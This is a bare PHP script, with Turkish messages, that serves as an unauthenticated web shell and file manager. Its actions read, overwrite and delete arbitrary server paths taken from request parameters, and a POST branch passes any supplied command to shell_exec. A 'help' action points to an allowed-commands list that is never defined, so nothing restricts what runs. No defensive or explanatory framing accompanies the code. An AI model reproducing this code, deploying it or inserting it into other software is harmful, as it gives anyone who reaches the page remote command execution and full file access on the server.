<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: application/json');

$action = $_GET['action'] ?? null;

if ($action === 'list') {
    $directory = __DIR__ . '/uploads/';
    if (!is_dir($directory)) {
        echo json_encode(['error' => 'Dizin mevcut değil']);
        exit;
    }

    $files = scandir($directory);
    if ($files === false) {
        echo json_encode(['error' => 'Dizin tarama hatası']);
        exit;
    }

    echo json_encode(['files' => $files]);
    exit;
}

if ($action === 'upload') {
    if (!empty($_FILES['file'])) {
        $uploadDir = __DIR__ . '/uploads/';
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir, 0755, true);
        }

        $filePath = $uploadDir . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $filePath)) {
            echo json_encode(['message' => 'Dosya başarıyla yüklendi.']);
        } else {
            echo json_encode(['message' => 'Dosya yükleme başarısız oldu.']);
        }
    } else {
        echo json_encode(['message' => 'Hiç dosya yüklenmedi.']);
    }
    exit;
}

if ($action === 'delete') {
    $file = $_GET['file'] ?? '';
    if (file_exists($file)) {
        unlink($file);
        echo json_encode(['message' => 'Dosya başarıyla silindi.']);
    } else {
        echo json_encode(['message' => 'Dosya bulunamadı.']);
    }
    exit;
}

if ($action === 'edit') {
    $file = $_GET['file'] ?? '';
    if (file_exists($file)) {
        $content = file_get_contents($file);
        echo json_encode(['content' => $content]);
    } else {
        echo json_encode(['message' => 'Dosya bulunamadı.']);
    }
    exit;
}

if ($action === 'save') {
    $input = json_decode(file_get_contents('php://input'), true);
    $file = $input['file'] ?? '';
    $content = $input['content'] ?? '';

    if ($file && $content !== null) {
        file_put_contents($file, $content);
        echo json_encode(['message' => 'Dosya başarıyla kaydedildi.']);
    } else {
        echo json_encode(['message' => 'Geçersiz giriş.']);
    }
    exit;
}

if ($action === 'help') {
    echo json_encode(['commands' => $allowedCommands]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);

    if (isset($input['command'])) {
        $command = escapeshellcmd($input['command']);
        $output = shell_exec($command);

        echo json_encode([
            'output' => $output ?? 'Komut çalıştırma hatası veya çıktı yok.'
        ]);
    } else {
        echo json_encode([
            'output' => 'Komut sağlanmadı.'
        ]);
    }
} else {
    echo json_encode([
        'output' => 'Geçersiz istek yöntemi.'
    ]);
}
?>
